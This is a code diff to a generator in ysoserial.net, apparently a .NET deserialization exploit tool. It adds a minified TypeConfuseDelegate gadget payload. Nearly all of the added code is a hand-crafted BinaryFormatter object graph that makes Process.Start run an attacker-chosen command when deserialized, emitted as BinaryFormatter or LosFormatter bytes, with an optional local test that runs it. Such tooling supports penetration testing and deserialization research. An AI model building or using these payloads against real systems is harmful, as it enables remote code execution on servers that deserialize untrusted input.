@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Reflection;
 using ysoserial.Helpers;
+using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
 
 namespace ysoserial.Generators
 {
@@ -36,7 +38,683 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
+            if(inputArgs.Minify && inputArgs.UseSimpleType && 
+                (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
+            {
+                // This is to provide even a smaller payload
+                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
+
+                /*
+                string tcd_json_minified = @"[{'Id': 1,
+    'Data': {
+      '$type': 'SerializationHeaderRecord',
+      'binaryFormatterMajorVersion': 1,
+      'binaryFormatterMinorVersion': 0,
+      'binaryHeaderEnum': 0,
+      'topId': 1,
+      'headerId': -1,
+      'majorVersion': 1,
+      'minorVersion': 0
+}},{'Id': 2,
+    'TypeName': 'Assembly',
+    'Data': {
+      '$type': 'BinaryAssembly',
+      'assemId': 2,
+      'assemblyString': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
+}},{'Id': 3,
+    'TypeName': 'ObjectWithMapTypedAssemId',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 5,
+      'objectId': 1,
+      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
+      'numMembers': 4,
+      'memberNames':['Count','Comparer','Version','Items'], 
+      'binaryTypeEnumA':[0,3,0,6],
+      'typeInformationA':[8,null,8,null],
+      'typeInformationB':[8,'', 8, null],
+      'memberAssemIds':[0,0,0,0],
+      'assemId': 2
+}},{'Id': 4,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 2
+}},{'Id': 5,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 3
+}},{'Id': 6,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 2
+}},{'Id': 7,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 4
+}},{'Id': 8,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 3,
+      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
+      'numMembers': 1,
+      'memberNames':['_comparison'],
+      'binaryTypeEnumA':[3],
+      'typeInformationA':[null],
+      'typeInformationB':[''],
+      'memberAssemIds':[0],
+      'assemId': 0
+}},{'Id': 9,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 5
+}},{'Id': 10,
+    'TypeName': 'ArraySingleString',
+    'Data': {
+      '$type': 'BinaryArray',
+      'objectId': 4,
+      'rank': 1,
+      'lengthA':[2],
+      'lowerBoundA':[0],
+      'binaryTypeEnum': 1,
+      'typeInformation': null,
+      'assemId': 0,
+      'binaryHeaderEnum': 17,
+      'binaryArrayTypeEnum': 0
+}},{'Id': 11,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 6,
+      'value': '"+ inputArgs.CmdArguments + @"'
+}},{'Id': 12,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 7,
+      'value': '"+ inputArgs.CmdFileName + @"'
+}},{'Id': 13,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 5,
+      'name': 'System.DelegateSerializationHolder',
+      'numMembers': 3,
+      'memberNames':['Delegate','method0',''],
+      'binaryTypeEnumA':[3,3,3],
+      'typeInformationA':[null,null,null],
+      'typeInformationB':['','',''],
+      'memberAssemIds':[0,0,0],
+      'assemId': 0
+}},{'Id': 14,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 8
+}},{'Id': 15,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 9
+}},{'Id': 16,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 10
+}},{'Id': 17,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 8,
+      'name': 'System.DelegateSerializationHolder+DelegateEntry',
+      'numMembers': 7,
+      'memberNames':['type','assembly','target','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
+      'binaryTypeEnumA':[1,1,2,1,1,1,3],
+      'typeInformationA':[null,null,null,null,null,null,null],
+      'typeInformationB':[null,null,null,null,null,null,''],
+      'memberAssemIds':[0,0,0,0,0,0,0],
+      'assemId': 0
+}},{'Id': 18,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 11,
+      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
+}},{'Id': 19,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 12,
+      'value': 'mscorlib'
+}},{'Id': 20,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 1
+}},{'Id': 21,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 13,
+      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
+}},{'Id': 22,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 14,
+      'value': 'System.Diagnostics.Process'
+}},{'Id': 23,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 15,
+      'value': 'Start'
+}},{'Id': 24,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 16
+}},{'Id': 25,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 9,
+      'name': 'System.Reflection.MemberInfoSerializationHolder',
+      'numMembers': 6,
+      'memberNames':['Name','AssemblyName','ClassName','Signature','MemberType',''],
+      'binaryTypeEnumA':[1,1,1,1,0,3],
+      'typeInformationA':[null,null,null,null,8,null],
+      'typeInformationB':[null,null,null,null,8,''
+],'memberAssemIds':[0,0,0,0,0,0],
+      'assemId': 0
+}},{'Id': 26,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 15
+}},{'Id': 27,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 13
+}},{'Id': 28,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 14
+}},{'Id': 29,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 20,
+      'value': 'System.Diagnostics.Process Start(System.String, System.String)'
+}},{'Id': 30,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 8
+}},{'Id': 31,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 1
+}},{'Id': 32,
+    'TypeName': 'Object',
+    'Data': {
+      '$type': 'BinaryObject',
+      'objectId': 10,
+      'mapId': 9
+}},{'Id': 33,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 21,
+      'value': 'Compare'
+}},{'Id': 34,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 12
+}},{'Id': 35,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 23,
+      'value': 'System.String'
+}},{'Id': 36,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 24,
+      'value': 'Int32 Compare(System.String, System.String)'
+}},{'Id': 37,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 8
+}},{'Id': 38,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 1
+}},{'Id': 39,
+    'TypeName': 'Object',
+    'Data': {
+      '$type': 'BinaryObject',
+      'objectId': 16,
+      'mapId': 8
+}},{'Id': 40,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 25,
+      'value': 'System.Comparison`1[[System.String]]'
+}},{'Id': 41,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 12
+}},{'Id': 42,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 1
+}},{'Id': 43,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 12
+}},{'Id': 44,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 23
+}},{'Id': 45,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 21
+}},{'Id': 47,
+    'TypeName': 'MessageEnd',
+    'Data': {
+      '$type': 'MessageEnd'
+}}]";*/
+                string tcd_json_minified = @"[{'Id': 1,
+    'Data': {
+      '$type': 'SerializationHeaderRecord',
+      'binaryFormatterMajorVersion': 1,
+      'binaryFormatterMinorVersion': 0,
+      'binaryHeaderEnum': 0,
+      'topId': 1,
+      'headerId': -1,
+      'majorVersion': 1,
+      'minorVersion': 0
+}},{'Id': 2,
+    'TypeName': 'Assembly',
+    'Data': {
+      '$type': 'BinaryAssembly',
+      'assemId': 2,
+      'assemblyString': 'System'
+}},{'Id': 3,
+    'TypeName': 'ObjectWithMapTypedAssemId',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 5,
+      'objectId': 1,
+      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
+      'numMembers': 4,
+      'memberNames':['Count','Comparer','Version','Items'], /*Version can be replaced with an empty string but it causes error after code execution*/
+                'binaryTypeEnumA':[0,1,0,1],
+      'typeInformationA': null,
+      'typeInformationB':[8,null,8,null],
+      'memberAssemIds':[0,0,0,0],
+      'assemId': 2
+}},{'Id': 4,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 2
+}},{'Id': 5,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 3
+}},{'Id': 6,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 0
+}},{'Id': 7,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 4
+}},{'Id': 8,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 3,
+      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
+      'numMembers': 1,
+      'memberNames':['_comparison'],
+      'binaryTypeEnumA':[1],
+      'typeInformationA': null,
+      'typeInformationB':[null],
+      'memberAssemIds':[0],
+      'assemId': 0
+}},{'Id': 9,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 5
+}},{'Id': 10,
+    'TypeName': 'ArraySingleString',
+    'Data': {
+      '$type': 'BinaryArray',
+      'objectId': 4,
+      'rank': 0,
+      'lengthA':[2],
+      'lowerBoundA': null,
+      'binaryTypeEnum': 0,
+      'typeInformation': null,
+      'assemId': 0,
+      'binaryHeaderEnum': 17,
+      'binaryArrayTypeEnum': 0
+}},{'Id': 11,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 6,
+      'value': '" + inputArgs.CmdArguments + @"'
+}},{'Id': 12,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 7,
+      'value': '" + inputArgs.CmdFileName + @"'
+}},{'Id': 13,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 5,
+      'name': 'System.DelegateSerializationHolder',
+      'numMembers': 3,
+      'memberNames':['Delegate','','x'],
+      'binaryTypeEnumA':[1,1,1],
+      'typeInformationA': null,
+      'typeInformationB':[null,null,null],
+      'memberAssemIds':[0,0,0],
+      'assemId': 0
+}},{'Id': 14,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 8
+}},{'Id': 15,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 1
+}},{'Id': 16,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 1
+}},{'Id': 17,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 8,
+      'name': 'System.DelegateSerializationHolder+DelegateEntry',
+      'numMembers': 7,
+      'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
+      'binaryTypeEnumA':[1,1,1,1,1,1,1],
+      'typeInformationA': null,
+      'typeInformationB':[null,null,null,null,null,null,null],
+      'memberAssemIds':[0,0,0,0,0,0,0],
+      'assemId': 0
+}},{'Id': 18,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 11,
+      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
+}},{'Id': 19,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 12,
+      'value': 'mscorlib'
+}},{'Id': 20,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 21,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 13,
+      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
+}},{'Id': 22,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 14,
+      'value': 'System.Diagnostics.Process'
+}},{'Id': 23,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 15,
+      'value': 'Start'
+}},{'Id': 24,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 16
+}},{'Id': 25,
+    'TypeName': 'ObjectWithMapTyped',
+    'Data': {
+      '$type': 'BinaryObjectWithMapTyped',
+      'binaryHeaderEnum': 4,
+      'objectId': 9,
+      'name': 'x',
+      'numMembers': 7,
+      'memberNames':['','','','','','',''],
+      'binaryTypeEnumA':[1,1,1,1,1,0,1],
+      'typeInformationA': null,
+      'typeInformationB':[null,null,null,null,null,8,null],
+      'memberAssemIds':[0,0,0,0,0,0,0],
+      'assemId': 0
+}},{'Id': 26,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 1
+}},{'Id': 27,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 1
+}},{'Id': 28,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 1
+}},{'Id': 29,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 20,
+      'value': ''
+}},{'Id': 30,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 21,
+      'value': ''
+}},{'Id': 31,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 0
+}},{'Id': 33,
+    'TypeName': 'Object',
+    'Data': {
+      '$type': 'BinaryObject',
+      'objectId': 10,
+      'mapId': 9
+}},{'Id': 34,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 22,
+      'value': 'Compare'
+}},{'Id': 35,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 1
+}},{'Id': 36,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 24,
+      'value': 'System.String'
+}},{'Id': 37,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 25,
+      'value': ''
+}},{'Id': 38,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 26,
+      'value': ''
+}},{'Id': 39,
+    'TypeName': 'Int32',
+    'IsPrimitive': true,
+    'Data': {
+      '$type': 'MemberPrimitiveUnTyped',
+      'typeInformation': 8,
+      'value': 0
+}},{'Id': 40,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 41,
+    'TypeName': 'Object',
+    'Data': {
+      '$type': 'BinaryObject',
+      'objectId': 16,
+      'mapId': 8
+}},{'Id': 42,
+    'TypeName': 'ObjectString',
+    'Data': {
+      '$type': 'BinaryObjectString',
+      'objectId': 27,
+      'value': 'System.Comparison`1[[System.String]]'
+}},{'Id': 43,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 12
+}},{'Id': 44,
+    'TypeName': 'ObjectNull',
+    'Data': {
+      '$type': 'ObjectNull',
+      'nullCount': 0
+}},{'Id': 45,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 12
+}},{'Id': 46,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 24
+}},{'Id': 47,
+    'TypeName': 'MemberReference',
+    'Data': {
+      '$type': 'MemberReference',
+      'idRef': 22
+}},{'Id': 49,
+    'TypeName': 'MessageEnd',
+    'Data': {
+      '$type': 'MessageEnd'
+}}]";
+
+                MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
+                if(formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
+                {
+                    //BinaryFormatter
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            ms_bf.Position = 0;
+                            SerializersHelper.BinaryFormatter_deserialize(ms_bf);
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
+                    }
+                    return ms_bf.ToArray();
+                }
+                else
+                {
+                    // LosFormatter
+                    MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);
+
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            ms_bf.Position = 0;
+                            SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
+                    }
+                    return ms_lf.ToArray();
+                }
+            }
+            else
+                return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
         }
 
         /* this can be used easily by the plugins as well */
